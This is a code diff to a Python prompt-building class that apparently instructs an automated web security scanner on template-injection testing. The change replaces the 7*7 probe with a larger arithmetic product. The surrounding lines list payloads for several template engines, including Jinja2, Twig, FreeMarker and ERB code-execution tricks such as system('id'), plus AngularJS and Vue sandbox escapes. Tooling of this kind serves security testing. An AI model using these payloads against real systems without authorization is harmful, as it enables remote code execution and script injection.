@@ -608,41 +608,46 @@ class TechContextMixin:
         # Strategic implications
         prompt_parts.append("")
         prompt_parts.append("## CSTI/SSTI STRATEGIC IMPLICATIONS")
+        prompt_parts.append(
+            "- Probe arithmetic with 1000003*1000003 (=1000006000009), never 7*7. "
+            "49 occurs naturally in page content, so it cannot prove evaluation; the "
+            "long product is the only result the confirmation step accepts."
+        )
 
         # Engine-specific guidance
         if "jinja2" in detected_engines or lang == "Python":
             prompt_parts.extend([
                 "- Jinja2 (Python): {{ config }}, {{ self.__class__.__mro__ }}",
                 "- Jinja2: RCE via __subclasses__(), __globals__, __builtins__",
-                "- Jinja2: Test with {{7*7}}, {{config.items()}}, {{request.application}}",
+                "- Jinja2: Test with {{1000003*1000003}}, {{config.items()}}, {{request.application}}",
             ])
         if "twig" in detected_engines or lang == "PHP":
             prompt_parts.extend([
                 "- Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}",
-                "- Twig: Test with {{7*7}}, {{app.request.server.all|join(',')}}",
+                "- Twig: Test with {{1000003*1000003}}, {{app.request.server.all|join(',')}}",
                 "- Twig: RCE via filter() function abuse",
             ])
         if "freemarker" in detected_engines or lang == "Java":
             prompt_parts.extend([
                 "- FreeMarker (Java): <#assign ex=\"freemarker.template.utility.Execute\"?new()>",
-                "- FreeMarker: Test with ${7*7}, ${.now}, ${product.class.protectionDomain}",
-                "- Velocity: #set($x=7*7)$x, $class.inspect(\"java.lang.Runtime\")",
+                "- FreeMarker: Test with ${1000003*1000003}, ${.now}, ${product.class.protectionDomain}",
+                "- Velocity: #set($x=1000003*1000003)$x, $class.inspect(\"java.lang.Runtime\")",
             ])
         if "erb" in detected_engines or lang == "Ruby":
             prompt_parts.extend([
-                "- ERB (Ruby): <%= 7*7 %>, <%= system('id') %>",
-                "- Slim/Haml: Test with = 7*7, = `id`",
+                "- ERB (Ruby): <%= 1000003*1000003 %>, <%= system('id') %>",
+                "- Slim/Haml: Test with = 1000003*1000003, = `id`",
                 "- ERB: Code execution via backticks or system()",
             ])
         if "razor" in detected_engines or lang == "ASP.NET":
             prompt_parts.extend([
-                "- Razor (ASP.NET): @(7*7), @Html.Raw(code)",
+                "- Razor (ASP.NET): @(1000003*1000003), @Html.Raw(code)",
                 "- Razor: Limited SSTI surface, focus on deserialization chains",
             ])
         if "ejs" in detected_engines or lang == "Node.js":
             prompt_parts.extend([
-                "- EJS (Node.js): <%- include('file') %>, <%= 7*7 %>",
-                "- Pug/Jade: #{7*7}, !{userInput}",
+                "- EJS (Node.js): <%- include('file') %>, <%= 1000003*1000003 %>",
+                "- Pug/Jade: #{1000003*1000003}, !{userInput}",
                 "- EJS: RCE via include with file traversal",
             ])
 
@@ -654,7 +659,7 @@ class TechContextMixin:
                 "## CLIENT-SIDE TEMPLATE INJECTION (CSTI)",
                 "- AngularJS detected: {{constructor.constructor('alert(1)')()}}",
                 "- Angular: Sandbox escapes for versions < 1.6",
-                "- Angular: Test with {{7*7}}, {{$on.constructor('alert(1)')()}}",
+                "- Angular: Test with {{1000003*1000003}}, {{$on.constructor('alert(1)')()}}",
             ])
         if "vue" in frontend_frameworks:
             prompt_parts.extend([
@@ -662,7 +667,7 @@ class TechContextMixin:
                 "## CLIENT-SIDE TEMPLATE INJECTION (CSTI)",
                 "- Vue.js detected: {{_c.constructor('alert(1)')()}}",
                 "- Vue: v-html directive enables XSS, not CSTI",
-                "- Vue: Test with {{7*7}}, {{constructor.constructor('alert(1)')()}}",
+                "- Vue: Test with {{1000003*1000003}}, {{constructor.constructor('alert(1)')()}}",
             ])
 
         # WAF evasion
